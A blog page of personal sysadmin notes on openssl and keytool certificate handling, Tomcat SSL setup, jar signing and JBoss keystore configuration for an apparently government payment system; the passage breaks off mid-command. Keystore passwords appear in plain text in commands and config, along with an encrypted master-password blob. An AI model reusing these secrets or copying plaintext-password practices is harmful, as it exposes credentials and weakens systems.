<!DOCTYPE HTML>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  <title>My Blog</title>
  <meta name="author" content="Forrest Wan">
  
  <meta name="description" content="My Blog">
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="My Blog"/>

  
    <meta property="og:image" content=""/>
  

  <link rel="shortcut icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
  

<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">My Blog</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/null">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
  <article id="post-Install-Certificate-From-Let&#39;s-Encrypt-To-Tomcat" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2019-10-10T04:07:07.000Z"><a href="/2019/10/10/Install-Certificate-From-Let's-Encrypt-To-Tomcat/">2019-10-10</a></time>
      
      
  
    <h1 class="title"><a href="/2019/10/10/Install-Certificate-From-Let's-Encrypt-To-Tomcat/">Install Certificate From Let&#39;s Encrypt To Tomcat</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="Got-3-files-from-https-www-sslforfree-com"><a href="#Got-3-files-from-https-www-sslforfree-com" class="headerlink" title="Got 3 files from https://www.sslforfree.com/"></a>Got 3 files from <a target="_blank" rel="noopener" href="https://www.sslforfree.com/">https://www.sslforfree.com/</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certificate.crt</span><br><span class="line">ca_bundle.crt</span><br><span class="line">private.key</span><br></pre></td></tr></table></figure>

<h2 id="Web-server-is-tomcat-merge-those-files-into-a-keystore"><a href="#Web-server-is-tomcat-merge-those-files-into-a-keystore" class="headerlink" title="Web server is tomcat, merge those files into a keystore"></a>Web server is tomcat, merge those files into a keystore</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in certificate.crt -inkey private.key -certfile certificate.crt -out testkeystore.p12</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -srckeystore testkeystore.p12 -srcstoretype pkcs12 -destkeystore ks.jks -deststoretype JKS</span><br><span class="line"></span><br><span class="line">keytool -changealias -keystore ks.jks -alias 1</span><br><span class="line">=&gt; alias: tomcat</span><br><span class="line"></span><br><span class="line">password: lles1234</span><br><span class="line"></span><br><span class="line">keytool -import -trustcacerts -alias root -file ca_bundle.crt -keystore ks.jks</span><br><span class="line"></span><br><span class="line">keytool -import -trustcacerts -alias lles -file certificate.crt -keystore ks.jks</span><br></pre></td></tr></table></figure>

<h2 id="Test-the-cert"><a href="#Test-the-cert" class="headerlink" title="Test the cert"></a>Test the cert</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_connect -showcerts -connect 127.0.0.1:443</span><br></pre></td></tr></table></figure>

<p>server.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;443&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">SSLEnabled=&quot;true&quot;</span><br><span class="line">scheme=&quot;https&quot; secure=&quot;true&quot; clientAuth=&quot;false&quot;</span><br><span class="line">sslProtocol=&quot;TLS&quot; keystoreFile=&quot;/your_path/ks.jks&quot;</span><br><span class="line">keystorePass=&quot;lles1234&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>Reference:<br><a target="_blank" rel="noopener" href="https://www.sslforfree.com/#tutorials">https://www.sslforfree.com/#tutorials</a><br><a target="_blank" rel="noopener" href="https://www.namecheap.com/support/knowledgebase/article.aspx/9423/33/installing-an-ssl-certificate-on-apache">https://www.namecheap.com/support/knowledgebase/article.aspx/9423/33/installing-an-ssl-certificate-on-apache</a><br><a target="_blank" rel="noopener" href="https://www.namecheap.com/support/knowledgebase/article.aspx/9441/33/installing-an-ssl-certificate-on-tomcat">https://www.namecheap.com/support/knowledgebase/article.aspx/9441/33/installing-an-ssl-certificate-on-tomcat</a><br><a target="_blank" rel="noopener" href="https://www.cyberciti.biz/faq/test-ssl-certificates-diagnosis-ssl-certificate/">https://www.cyberciti.biz/faq/test-ssl-certificates-diagnosis-ssl-certificate/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Sign-Jar" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2019-05-08T03:40:39.000Z"><a href="/2019/05/08/Sign-Jar/">2019-05-08</a></time>
      
      
  
    <h1 class="title"><a href="/2019/05/08/Sign-Jar/">Sign Jar</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="generate-certitficate-signing-request"><a href="#generate-certitficate-signing-request" class="headerlink" title="generate certitficate signing request"></a>generate certitficate signing request</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">keytool -certreq -alias xxx -keystore xxx_signing.jks -file certreq.pem.2</span><br><span class="line">keytool -importcert -alias inter   -file intermediate.pem  -keystore xxx_signing.jks -storepass yyy.xxx@2017</span><br><span class="line">keytool -importcert -alias root    -file root.pem          -keystore xxx_signing.jks -storepass yyy.xxx@2017</span><br><span class="line">keytool -importcert -alias xxx  -file signedcert.pem    -keystore xxx_signing.jks -storepass yyy.xxx@2017</span><br></pre></td></tr></table></figure>

<h2 id="print-certificate-request"><a href="#print-certificate-request" class="headerlink" title="print certificate request"></a>print certificate request</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -printcertreq -file certreq.pem</span><br><span class="line">openssl req -in certreq.pem -noout -text</span><br></pre></td></tr></table></figure>

<h2 id="sign-jnlp-jar"><a href="#sign-jnlp-jar" class="headerlink" title="sign jnlp jar"></a>sign jnlp jar</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">D:\signjar&gt; mkdir hk\gov\ogcio</span><br><span class="line">D:\signjar&gt; mkdir hk\gov\xxx\user\fxbrowser</span><br><span class="line"></span><br><span class="line">xxx\public\bin&gt; </span><br><span class="line">xcopy /y hk\gov\ogcio /s D:\signjar\bin\hk\gov\ogcio</span><br><span class="line">xcopy /y hk\gov\xxx\user\fxbrowser /s D:\signjar\bin\hk\gov\xxx\user\fxbrowser</span><br><span class="line">copy smartid.properties D:\signjar\bin</span><br><span class="line">copy pkcs12.properties D:\signjar\bin</span><br><span class="line">copy etoken.properties D:\signjar\bin </span><br><span class="line"></span><br><span class="line">jar -cf fxbrowser.jar -C bin/ .</span><br><span class="line">jar ufm fxbrowser.jar Manifest.txt</span><br><span class="line">pack200 --repack fxbrowser.jar</span><br><span class="line">// pack200 --repack itextpdf-5.5.6.jar</span><br><span class="line">// pack200 --repack bcprov-jdk15on-1.56.jar</span><br><span class="line">// pack200 --repack bcpkix-jdk15on-1.56.jar</span><br><span class="line"></span><br><span class="line">jarsigner -tsa http://sha256timestamp.ws.symantec.com/sha256/timestamp -keystore xxx_signing.jks fxbrowser.jar xxx -storepass yyy.xxx@2017</span><br><span class="line">jarsigner -tsa http://sha256timestamp.ws.symantec.com/sha256/timestamp -keystore xxx_signing.jks itextpdf-5.5.6.jar xxx -storepass yyy.xxx@2017</span><br><span class="line">jarsigner -tsa http://sha256timestamp.ws.symantec.com/sha256/timestamp -keystore xxx_signing.jks bcprov-jdk15on-1.56.jar xxx -storepass yyy.xxx@2017</span><br><span class="line">jarsigner -tsa http://sha256timestamp.ws.symantec.com/sha256/timestamp -keystore xxx_signing.jks bcpkix-jdk15on-1.56.jar xxx -storepass yyy.xxx@2017</span><br><span class="line"></span><br><span class="line">pack200 fxbrowser.jar.pack.gz fxbrowser.jar</span><br><span class="line">pack200 itextpdf-5.5.6.jar.pack.gz itextpdf-5.5.6.jar</span><br><span class="line">pack200 bcprov-jdk15on-1.56.jar.pack.gz bcprov-jdk15on-1.56.jar</span><br><span class="line">pack200 bcpkix-jdk15on-1.56.jar.pack.gz bcpkix-jdk15on-1.56.jar</span><br><span class="line"></span><br><span class="line">del fxbrowser__V1.4.jar.pack.gz</span><br><span class="line">rename fxbrowser.jar.pack.gz fxbrowser__V1.4.jar.pack.gz</span><br><span class="line">rename itextpdf-5.5.6.jar.pack.gz itextpdf-5.5.6__V1.0.jar.pack.gz</span><br><span class="line">rename bcprov-jdk15on-1.56.jar.pack.gz bcprov-jdk15on-1.56__V1.0.jar.pack.gz</span><br><span class="line">rename bcpkix-jdk15on-1.56.jar.pack.gz bcpkix-jdk15on-1.56__V1.0.jar.pack.gz</span><br><span class="line"></span><br><span class="line">copy /y fxbrowser__V1.4.jar.pack.gz C:\Users\my\Desktop\Forrest\workspace\xxx\public\src\main\resources\public\user</span><br><span class="line">copy /y fxbrowser__V1.4.jar.pack.gz Y:\public\bin\public\user</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>  <a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E19509-01/820-3503/ggezu/">https://docs.oracle.com/cd/E19509-01/820-3503/ggezu/</a><br>  <a target="_blank" rel="noopener" href="https://blogs.oracle.com/blogbypuneeth/steps-to-create-a-csr-certificate-signing-request-using-keytool-and-get-it-signed-from-an-external-ca-certificate-authority-thawte">https://blogs.oracle.com/blogbypuneeth/steps-to-create-a-csr-certificate-signing-request-using-keytool-and-get-it-signed-from-an-external-ca-certificate-authority-thawte</a><br>  <a target="_blank" rel="noopener" href="http://docs.oracle.com/javase/7/docs/technotes/guides/jweb/security/rsa_signing.html">http://docs.oracle.com/javase/7/docs/technotes/guides/jweb/security/rsa_signing.html</a></p>
<h2 id="Import-certificate"><a href="#Import-certificate" class="headerlink" title="Import certificate"></a>Import certificate</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -import -trustcacerts -keystore xxx_signing.jks -alias xxx -file ssl_certificate.p7b</span><br></pre></td></tr></table></figure>

<h2 id="Add-key-entry-to-xxx-signing-jks-for-pdf-signing"><a href="#Add-key-entry-to-xxx-signing-jks-for-pdf-signing" class="headerlink" title="Add key entry to xxx_signing.jks for pdf signing"></a>Add key entry to xxx_signing.jks for pdf signing</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">useless:</span><br><span class="line"> openssl pkcs12 -export -inkey www.dummy.gov.hk-privateKey.key -in www.dummy.gov.hk.crt -name xxx-cert -out xxx-cert.p12</span><br><span class="line"> keytool -importkeystore -srckeystore ..\apache\ssl\public\xxx-cert.p12 -srcstoretype pkcs12 -alias xxx-cert -destkeystore xxx_signing.jks</span><br><span class="line"></span><br><span class="line">self-sign:</span><br><span class="line">  openssl req -x509 -newkey rsa:2048 -keyout sign-pdf-cert-key.pem -out sign-pdf-cert.pem -days 3650</span><br><span class="line">  openssl x509 -text -noout -in sign-pdf-cert.pem (review cert)</span><br><span class="line">  openssl pkcs12 -inkey sign-pdf-cert-key.pem -in sign-pdf-cert.pem -export -name xxx-cert -out sign-pdf-cert.p12</span><br><span class="line">  openssl pkcs12 -in certificate.p12 -noout -info (validate p12 file)</span><br><span class="line">  keytool -importkeystore -srckeystore sign-pdf-cert.p12 -srcstoretype pkcs12 -alias xxx-cert -destkeystore xxx_signing.jks</span><br></pre></td></tr></table></figure>

<h2 id="jks-location"><a href="#jks-location" class="headerlink" title="jks location"></a>jks location</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\keystore\xxx_signing.jks comes from public\config\jws\xxx_signing.jks</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Generate-SSL-Cert" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2019-05-08T03:31:39.000Z"><a href="/2019/05/08/Generate-SSL-Cert/">2019-05-08</a></time>
      
      
  
    <h1 class="title"><a href="/2019/05/08/Generate-SSL-Cert/">Generate SSL Cert</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="generate-private-key"><a href="#generate-private-key" class="headerlink" title="generate private key"></a>generate private key</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out xxx-privateKey.key 2048``` no passphase to protect private key</span><br></pre></td></tr></table></figure>

<h2 id="generate-public-certificate-for-domain-of-dummy-gov-hk"><a href="#generate-public-certificate-for-domain-of-dummy-gov-hk" class="headerlink" title="generate public certificate for domain of dummy.gov.hk"></a>generate public certificate for domain of dummy.gov.hk</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. openssl req -out xxx.csr -new -newkey rsa:2048 -sha256 -nodes -key xxx-privateKey.key</span><br><span class="line">2. openssl req -text -noout -verify -in xxx.csr</span><br></pre></td></tr></table></figure>

<h2 id="re-generate-csr-with-same-private-key"><a href="#re-generate-csr-with-same-private-key" class="headerlink" title="re-generate csr with same private key"></a>re-generate csr with same private key</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3. openssl req -new -sha256 -nodes -out www.dummy.gov.hk.csr -key www.dummy.gov.hk-privateKey.key -config config.txt</span><br><span class="line">4. openssl req -text -noout -verify -in www.dummy.gov.hk.csr &gt; www.dummy.gov.hk.csr.verify.txt</span><br></pre></td></tr></table></figure>

<h2 id="generate-private-key-for-internal-certificate-for-domain-of-dummy-hksarg"><a href="#generate-private-key-for-internal-certificate-for-domain-of-dummy-hksarg" class="headerlink" title="generate private key for internal certificate for domain of *.dummy.hksarg"></a>generate private key for internal certificate for domain of *.dummy.hksarg</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. openssl req -new -sha256 -nodes -out dummy.hksarg.csr -newkey rsa:2048 -keyout xxx.hksarg-privateKey.key -config config.txt</span><br><span class="line">2. openssl req -text -noout -verify -in dummy.hksarg.csr</span><br></pre></td></tr></table></figure>

<h2 id="generate-3-internal-certificates-for-domain-of-dummy-hksarg-by-one-private-key"><a href="#generate-3-internal-certificates-for-domain-of-dummy-hksarg-by-one-private-key" class="headerlink" title="generate 3 internal certificates for domain of *.dummy.hksarg by one private key"></a>generate 3 internal certificates for domain of *.dummy.hksarg by one private key</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. openssl req -new -sha256 -nodes -out sit.dummy.hksarg.csr -key xxx.hksarg-privateKey.key -config config.txt</span><br><span class="line">2. openssl req -text -noout -verify -in sit.dummy.hksarg.csr &gt; sit.xxx.hksarg.csr.verify.txt</span><br><span class="line"></span><br><span class="line">1. openssl req -new -sha256 -nodes -out uat.dummy.hksarg.csr -key xxx.hksarg-privateKey.key -config config.txt</span><br><span class="line">2. openssl req -text -noout -verify -in uat.dummy.hksarg.csr &gt; uat.xxx.hksarg.csr.verify.txt</span><br><span class="line"></span><br><span class="line">1. openssl req -new -sha256 -nodes -out dummy.hksarg.csr -key xxx.hksarg-privateKey.key -config config.txt</span><br><span class="line">2. openssl req -text -noout -verify -in dummy.hksarg.csr &gt; dummy.hksarg.csr.verify.txt</span><br></pre></td></tr></table></figure>

<h2 id="convert-p7b-cert-format-to-PEM"><a href="#convert-p7b-cert-format-to-PEM" class="headerlink" title="convert p7b cert format to PEM"></a>convert p7b cert format to PEM</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs7 -print_certs -inform der -in certnew-der.p7b &gt; sit.dummy.hksarg.crt</span><br><span class="line">openssl pkcs7 -print_certs -inform der -in certnew-der.p7b &gt; uat.dummy.hksarg.crt</span><br><span class="line">openssl pkcs7 -print_certs -inform der -in certnew-der.p7b &gt; dummy.hksarg.crt</span><br></pre></td></tr></table></figure>

<h2 id="conbime-cert-and-cacert"><a href="#conbime-cert-and-cacert" class="headerlink" title="conbime cert and cacert"></a>conbime cert and cacert</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -in cert0002107503.cer -subject -issuer -out cert0002107503.crt</span><br><span class="line">openssl x509 -in ecert_ca_1-15_pem.crt -subject -issuer -out ecert_ca_1-15_pem.crt</span><br><span class="line">openssl x509 -in root_ca_1_pem.crt -subject -issuer -out root_ca_1_pem.crt</span><br><span class="line"></span><br><span class="line">cat cert0002107503.crt ecert_ca_1-15_pem.crt root_ca_1_pem.crt &gt; www.dummy.gov.hk.crt</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Instal-RM" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2019-05-08T03:03:39.000Z"><a href="/2019/05/08/Instal-RM/">2019-05-08</a></time>
      
      
  
    <h1 class="title"><a href="/2019/05/08/Instal-RM/">Instal RM</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="Export-some-dependencies-like-org-dom4j-and-javax-jms-api-in-jboss-deployment-structure-xml"><a href="#Export-some-dependencies-like-org-dom4j-and-javax-jms-api-in-jboss-deployment-structure-xml" class="headerlink" title="Export some dependencies like org.dom4j and javax.jms.api in jboss-deployment-structure.xml"></a>Export some dependencies like org.dom4j and javax.jms.api in jboss-deployment-structure.xml</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">egis_rm_paymentrecon-dept_web</span><br><span class="line">&lt;jboss-deployment-structure xmlns=&quot;urn:jboss:deployment-structure:1.1&quot;&gt;</span><br><span class="line">	&lt;deployment&gt;</span><br><span class="line">		&lt;resources&gt;</span><br><span class="line">			&lt;resource-root path=&quot;lib/bcprov-jdk15on-1.51.jar&quot; use-physical-code-source=&quot;true&quot;/&gt;</span><br><span class="line">		&lt;/resources&gt;</span><br><span class="line">		&lt;dependencies&gt;</span><br><span class="line">			&lt;!-- for quartz --&gt;</span><br><span class="line">			&lt;module name=&quot;com.mysql&quot; export=&quot;true&quot;/&gt;</span><br><span class="line">		&lt;/dependencies&gt;</span><br><span class="line">	&lt;/deployment&gt;</span><br><span class="line">&lt;/jboss-deployment-structure&gt;</span><br><span class="line"></span><br><span class="line">egis_rm_paymentrecon-portal_web</span><br><span class="line">&lt;jboss-deployment-structure xmlns=&quot;urn:jboss:deployment-structure:1.2&quot;&gt;</span><br><span class="line">	&lt;deployment&gt;</span><br><span class="line">		&lt;dependencies&gt;</span><br><span class="line">			&lt;!-- for castor, don&#x27;t know which XML serializer is configured --&gt;</span><br><span class="line">			&lt;!-- therefore, include both from JDK and Xerces --&gt;</span><br><span class="line">			&lt;system export=&quot;true&quot;&gt;</span><br><span class="line">				&lt;paths&gt;</span><br><span class="line">					&lt;path name=&quot;com/sun/org/apache/xml/internal/serialize&quot; /&gt;</span><br><span class="line">				&lt;/paths&gt;</span><br><span class="line">			&lt;/system&gt;</span><br><span class="line"></span><br><span class="line">			&lt;module name=&quot;org.apache.xalan&quot; export=&quot;true&quot; /&gt;</span><br><span class="line">			&lt;module name=&quot;org.apache.xerces&quot; export=&quot;true&quot; /&gt;</span><br><span class="line">			&lt;module name=&quot;org.dom4j&quot; export=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">			&lt;!-- for quartz --&gt;</span><br><span class="line">			&lt;module name=&quot;com.mysql&quot; export=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;/dependencies&gt;</span><br><span class="line">	&lt;/deployment&gt;</span><br><span class="line">&lt;/jboss-deployment-structure&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Add-application-user-for-role-keyservice-admin-by-calling-bin-x2F-add-user-bat"><a href="#Add-application-user-for-role-keyservice-admin-by-calling-bin-x2F-add-user-bat" class="headerlink" title="Add application user for role keyservice_admin by calling bin&#x2F;add-user.bat"></a>Add application user for role keyservice_admin by calling bin&#x2F;add-user.bat</h2><h2 id="Update-standalone-conf-to-add-RM-config-path"><a href="#Update-standalone-conf-to-add-RM-config-path" class="headerlink" title="Update standalone.conf to add RM config path"></a>Update standalone.conf to add RM config path</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set &quot;JAVA_OPTS=%JAVA_OPTS% -Dhk.gov.ogcio.egis.rm.common.PROPERTIES_FILEPATH=D:\rm -Djboss.bind.address=0.0.0.0 -Dspring.profiles.active=uat&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Generate-key-store"><a href="#Generate-key-store" class="headerlink" title="Generate key store"></a>Generate key store</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -keystore xxx_master.jks -keyalg RSA -keysize 2048 -alias my-alais -validity 3650 -storepass yyy.xxx@2017</span><br><span class="line">*** CN=Companies Registry, OU=Companies Registry, O=Companies Registry, L=Hong Kong, ST=Hong Kong, C=HK ***</span><br><span class="line">keytool -list -v -keystore xxx_master.jks</span><br><span class="line"></span><br><span class="line">Copy xxx\rm2\keys\sit\xxx_master.jks to d:/keystore</span><br><span class="line"></span><br><span class="line">Generate master password in DB</span><br><span class="line">java -cp C:\Users\xxx01\Desktop\Forrest\workspace\RM2-Keyservice\bin;C:\Users\xxx01\Desktop\Forrest\workspace\RM2-Common\bin hk.gov.ogcio.egis.rm.keyservice.utils.KeystoreInstallSuite /d:/keystore/xxx_master.jks JKS yyy.xxx@2017 my-alais yyy.xxx@2017 SHA256 RSA/ECB/OAEPWithSHA1AndMGF1Padding</span><br><span class="line"></span><br><span class="line">INSERT INTO PASSWORD_STORE(PASSWORD_STORE_ID, USER_ID, USAGE_TYPE, PASSWORD, SIGNATURE, LAST_UPDATE_DT) VALUES (&#x27;0&#x27;, &#x27;MASTER_PASSWORD&#x27;, &#x27;INTERNAL&#x27;, &#x27;xzn+q7+DcT/Z2eTHVDDO9WRia4R/CHP23cU2bA9Eatgh6xA6Ah5qaK6CTf93ILT+C8ezhDMAe0/IdU916ExB8+iXozYKNnBp5/g4YpvzGYDcsYM6GnH5KA3YZY6EchRjXw1P576m5jQdMY6bQmcdEg7bB1JwufkISneQV1SnpuKev9G4O2oTHamyvaGuAxtj1lWm5we4AmBgGD6hF75ZAdu/IKL2n5h1BflT61jcSCrTYW0yCkWR0JFoN+x7eM3WGBZcw/BDWpIAfxVR6O0hJTkw6S6SDM6kheusfpzc36wcBrxP2yG/Jp+TZVWpSKDxCkLaM+i68K8wonEkQO0nBQ==&#x27;, &#x27;DeKWX8F/81JGQWeKowS5KsWNu2Poid7w+nDyC3IFRkdjNxAO+yqgKt9GX6QjAa3C61PtbMvPKxzfRjqZZeCx5aUbN+S4FCjKW8b4y8EZxI1TOSc31W6Je2McBxSRqqNPbB382W4lP+K7BXFIC0MS5PGtx+ES28k+rfLJcoRHzlhHKgkXUSIknPfWzLOzGJsg3DFynDXMoH3Jc7lZ2QRWZ2lmfqHm1rPGBfpg6W3YFzFDxJaA/U36A4xrGsYBja3v7+QLQFH7CtvF7XBWAN3HZpBylY8z/5MhMvwo+sj0dVc7z7Q2RLTd1ID0E2C6jI1CKLfLc2SKnho8phzT8xX8rg==&#x27;, now());</span><br></pre></td></tr></table></figure>
<h2 id="Add-support-for-HKPOST-TRIAL-cert-for-testing-in-webserver-properties"><a href="#Add-support-for-HKPOST-TRIAL-cert-for-testing-in-webserver-properties" class="headerlink" title="Add support for HKPOST_TRIAL cert for testing in webserver.properties"></a>Add support for HKPOST_TRIAL cert for testing in webserver.properties</h2><h2 id="Payment-and-Payment-Reconciliation"><a href="#Payment-and-Payment-Reconciliation" class="headerlink" title="Payment and Payment Reconciliation"></a>Payment and Payment Reconciliation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">generate privateKeyEntry (friendly3)</span><br><span class="line">  openssl pkcs12 -export -inkey my.hksarg-privateKey.key -in sit.xxx.cr.hksarg.crt -name friendly3 -out friendly3.p12</span><br><span class="line">  keytool -importkeystore -srckeystore friendly3.p12 -srcstoretype pkcs12 -alias friendly3 -destkeystore xxx_egis.jks</span><br><span class="line"></span><br><span class="line"> UAT renew:</span><br><span class="line">   keytool -v -list -keystore xxx_egis.jks -alias friendly3 -storepass yyy.xxx@2017</span><br><span class="line">   keytool -delete -keystore xxx_egis.jks -alias friendly3 -storepass yyy.xxx@2017</span><br><span class="line">   openssl pkcs12 -export -inkey my.hksarg-privateKey.key -in uat.my.cr.hksarg.crt -name friendly3 -out friendly3.p12</span><br><span class="line">   keytool -importkeystore -srckeystore friendly3.p12 -srcstoretype pkcs12 -alias friendly3 -destkeystore xxx_egis.jks</span><br><span class="line"></span><br><span class="line">Generate trustedCertEntry (epayment_signing)</span><br><span class="line">  keytool -genkey -keystore payment_signing.jks -keyalg RSA -keysize 2048 -validity 3650 -storepass yyy.xxx@2017</span><br><span class="line">  keytool -import -v -alias payment_signing -file UAT_2016_epayment_signing-b64.cer -keystore xxx_egis.jks -storepass 